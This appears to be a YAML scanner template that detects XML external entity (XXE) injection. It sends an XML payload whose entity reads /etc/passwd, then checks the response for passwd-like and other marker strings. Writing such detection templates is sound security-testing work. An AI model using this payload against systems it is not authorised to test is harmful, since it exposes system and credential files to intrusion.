id: xxe5-0561
name: 'XXE read in envelope'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via envelope'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      envelope:
        - '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'root:'
          - 'XXE_OK'
          - 'localhost'
          - 'uid='
          - 'PD9waHA'
